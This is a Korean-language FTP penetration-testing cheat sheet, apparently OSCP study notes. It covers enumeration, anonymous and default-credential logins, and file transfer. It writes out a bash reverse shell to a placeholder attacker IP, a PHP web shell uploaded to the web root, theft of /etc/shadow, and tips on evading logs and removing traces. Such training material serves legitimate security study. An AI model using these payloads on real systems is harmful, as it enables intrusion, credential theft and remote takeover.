# FTP (File Transfer Protocol)

## FTP 주요 포트

- 21/TCP - 기본 FTP 제어 포트
- 20/TCP - FTP 데이터 포트 (액티브 모드)
- 랜덤 높은 포트 - 데이터 포트 (패시브 모드)

## 기본 명령어

### 연결/인증

```bash
ftp target.com           # 기본 포트(21) 연결
ftp -p target.com        # 패시브 모드 사용
ftp target.com 2121      # 비표준 포트 연결
nc -v target.com 21      # netcat으로 수동 연결

# 로그인 방법
anonymous               # 익명 로그인
anonymous@domain.com    # 익명 로그인 (이메일 형식)
user                    # 특정 계정
```

### 내부 명령어

```bash
ls -la             # 상세 파일 목록
dir                # 파일 목록 (윈도우 스타일)
cd directory       # 디렉터리 이동
pwd                # 현재 경로 확인
binary             # 바이너리 모드 전송 (권장)
ascii              # 텍스트 모드 전송 (기본값)

# 파일 전송 명령어
get file                # 파일 다운로드
mget file1 file2        # 여러 파일 다운로드
put file                # 파일 업로드
mput file1 file2        # 여러 파일 업로드
```

## 침투 테스트 활용

### 익명 FTP 접속

```bash
# 익명 접속 가능 여부 확인 (중요)
ftp target.com
> anonymous
> (Enter 또는 아무 이메일)

# 스크립트로 자동 테스트
echo -e "anonymous\nanonymous\nbye\n" | ftp -nv target.com
```

### 파일 전송 자동화

```bash
# 비대화형 FTP 파일 다운로드
ftp -n target.com <<EOF
user anonymous anonymous
binary
cd /pub
get secret.txt
bye
EOF

# 배치 파일 사용
cat > ftpcmds.txt << EOF
user anonymous anonymous
binary
cd /upload
put shell.php
bye
EOF
ftp -n target.com < ftpcmds.txt
```

### FTP 서버 시작 (공격자)

```bash
# 내 컴퓨터에서 FTP 서버 빠르게 시작
# 1. Python ftplib
python -m pyftpdlib -p 21 -w

# 2. vsftpd 설정
echo "anonymous_enable=YES" >> /etc/vsftpd.conf
echo "anon_upload_enable=YES" >> /etc/vsftpd.conf
echo "write_enable=YES" >> /etc/vsftpd.conf
systemctl restart vsftpd
```

ftp> mget _ # 여러 파일 다운로드
ftp> put file # 파일 업로드
ftp> mput _ # 여러 파일 업로드
ftp> binary # 바이너리 모드 전환
ftp> ascii # ASCII 모드 전환
ftp> bye # 연결 종료
ftp> quit # 연결 종료

````

### 🔹 수동 FTP 열거 (Enumeration)

```bash
# 배너 그래빙
nc -vn target_ip 21

# 버전 확인을 통한 취약점 식별
openssl s_client -connect target_ip:21 -starttls ftp  # FTPS 확인

# FTP 포트 확인
nmap -p 21 target_ip
````

### 🔹 FTP 서버 브루트포스 (수동, OSCP 허용)

```bash
# 수동으로 일반 계정 확인
ftp target_ip
> admin
> admin
> exit

ftp target_ip
> root
> root
> exit
```

수동 테스트할 일반적인 사용자명/비밀번호 조합:

- admin:admin
- admin:password
- root:root
- root:toor
- administrator:password
- ftp:ftp
- anonymous:(빈 비밀번호)
- user:user
- guest:guest

## 4. FTP 서버를 통한 파일 전송 기법

### 🔹 공격자 서버에서 타겟으로 파일 전송

```bash
# 로컬에 전송할 파일 준비
echo '#!/bin/bash' > backdoor.sh
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> backdoor.sh
chmod +x backdoor.sh

# FTP를 통해 파일 업로드
ftp target_ip
> username
> password
ftp> cd /upload/directory
ftp> binary  # 중요! 바이너리 모드로 전환
ftp> put backdoor.sh
ftp> quit
```

### 🔹 타겟 시스템에서 파일 가져오기

```bash
# 타겟에서 중요 파일 다운로드
ftp target_ip
> username
> password
ftp> cd /etc
ftp> binary
ftp> get passwd
ftp> get shadow  # 권한이 있을 경우
ftp> quit
```

## 5. FTP 취약점 활용 사례

### 🔹 시나리오 1: 익명 FTP를 통한 정보 수집

1. 익명 FTP 접속 시도:

```bash
ftp target_ip
> anonymous
> (빈 비밀번호)
```

2. 민감한 파일 검색:

```bash
ftp> ls -la  # 숨김 파일 포함 모든 파일 표시
ftp> cd ...  # 디렉토리 탐색 시도
```

3. 발견된 정보 활용:

```bash
# 비밀번호 파일이나 구성 파일 다운로드
ftp> get config.php
ftp> get .htpasswd
```

### 🔹 시나리오 2: FTP 업로드 취약점 활용

1. 웹셸 업로드 테스트:

```bash
# 웹셸 준비
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# FTP로 업로드
ftp target_ip
> username
> password
ftp> cd /var/www/html  # 웹 디렉터리
ftp> put shell.php
```

2. 웹셸 접근:

```bash
curl "http://target_ip/shell.php?cmd=id"
```

### 🔹 시나리오 3: 구성 오류 이용

1. FTP 홈 디렉토리 탐색:

```bash
ftp target_ip
> username
> password
ftp> pwd  # 현재 디렉토리 확인
ftp> cd ..  # 상위 디렉토리 이동 시도
```

2. 디렉토리 순회 취약점 테스트:

```bash
ftp> cd ../..  # 루트로 이동 시도
ftp> ls
ftp> cd /etc  # 중요 디렉토리 접근 시도
```

## 6. FTP 보안 모드 및 우회 방법

### 🔹 FTP 모드 이해하기

1. **액티브 모드 (PORT)**:

   - 클라이언트가 데이터 연결을 수신하고 포트를 개방
   - 방화벽이 이를 차단할 수 있음

2. **패시브 모드 (PASV)**:
   - 서버가 데이터 연결을 수신하기 위해 임의의 포트 개방
   - 방화벽 우회에 더 효과적

```bash
# 패시브 모드 사용
ftp -p target_ip
# 또는 연결 후
ftp> passive
```

### 🔹 SSL/TLS를 사용하는 FTPS 접속

```bash
# FTPS 서버에 연결 (OpenSSL 필요)
openssl s_client -connect target_ip:990
```

### 🔹 FTP 방화벽 우회 기법

1. **다양한 포트 시도**:

```bash
# 비표준 포트에서 실행 중인 FTP 서버 접속
ftp -p target_ip 2121
```

2. **수동 넷캣 연결**:

```bash
# FTP 서비스 수동 탐색
nc -vn target_ip 21
USER anonymous
PASS anonymous
PASV
LIST
```

## 7. FTP 데이터 처리 모드 이해

### 🔹 ASCII vs 바이너리 모드

1. **ASCII 모드**: 텍스트 파일 전송용 (기본값)

   - 줄바꿈 문자 자동 변환
   - 스크립트나 텍스트 파일 전송 시 사용

2. **바이너리 모드**: 실행 파일, 이미지, 압축 파일 등 전송용
   - 파일을 있는 그대로 전송
   - 실행 가능한 파일이나 스크립트 전송 시 필수

```bash
# 모드 전환
ftp> ascii   # ASCII 모드로 전환
ftp> binary  # 바이너리 모드로 전환 (권장)
```

## 8. FTP 사용 시 주의사항 (OSCP 관점)

1. **트래픽 감지 최소화**:

   - 여러 번 로그인 시도는 로그에 기록될 수 있음
   - 불필요한 명령어 입력 자제

2. **파일 권한 확인**:

   - 업로드된 파일의 실행 권한 확인
   - `chmod` 명령이 가능한지 테스트

3. **흔적 제거**:

   - 불필요한 파일 삭제

   ```bash
   ftp> delete uploaded_file.php
   ```

4. **증거 수집 철저히**:

   - 다운로드한 모든 파일의 해시값 기록
   - 발견한 중요 정보 문서화

5. **전송 검증**:
   - 중요 파일 전송 후 MD5 확인
   ```bash
   md5sum file.txt  # 전송 전
   # 전송 후 대상 시스템에서도 동일하게 확인
   ```

## 9. FTP 활용 체크리스트

- [ ] 익명 FTP 접속 테스트
- [ ] 기본 자격 증명 시도
- [ ] 디렉토리 리스팅 및 민감한 파일 검색
- [ ] 업로드 권한 테스트
- [ ] 디렉토리 순회 취약점 확인
- [ ] 발견한 구성 파일 분석
- [ ] 업로드된 파일의 실행 권한 확인

---

## 🔗 OSCP 시험용 FTP 명령어 치트 시트

| 목적               | 명령어                            |
| ------------------ | --------------------------------- |
| FTP 서버 접속      | `ftp target_ip`                   |
| 익명 로그인        | `anonymous` + 빈 비밀번호         |
| 패시브 모드        | `ftp -p target_ip` 또는 `passive` |
| 바이너리 모드 전환 | `binary`                          |
| 모든 파일 보기     | `ls -la`                          |
| 파일 다운로드      | `get filename`                    |
| 여러 파일 다운로드 | `mget *`                          |
| 파일 업로드        | `put filename`                    |
| 여러 파일 업로드   | `mput *`                          |
| 디렉토리 생성      | `mkdir dirname`                   |
| 디렉토리 변경      | `cd dirname`                      |
| 연결 종료          | `bye` 또는 `quit`                 |
| FTP 배너 그래빙    | `nc -vn target_ip 21`             |
